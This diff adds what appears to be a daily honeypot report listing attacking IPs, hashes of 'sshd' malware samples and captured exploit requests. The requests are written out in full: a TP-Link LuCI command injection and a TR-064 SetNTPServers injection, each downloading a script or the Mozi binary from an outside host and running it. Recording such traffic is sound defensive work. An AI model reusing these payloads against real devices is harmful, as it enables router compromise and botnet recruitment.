@@ -1,0 +1,32 @@
+Top 5 IPs for 16-07-2024 :
+
+222.246.43.23
+220.161.122.210
+221.181.127.106
+119.206.117.12
+106.75.144.239
+
+Malware Observed:
+
+File name: sshd
+b14212857fe74349571dc653447dd59ff5938a768a65f90a3d4d653b669f8c83
+https://www.virustotal.com/gui/file/b14212857fe74349571dc653447dd59ff5938a768a65f90a3d4d653b669f8c83
+
+
+File name: sshd
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+Commands/exploits observed:
+<Host IP>/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60)
+
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7574
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://42.177.63.191:54341/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
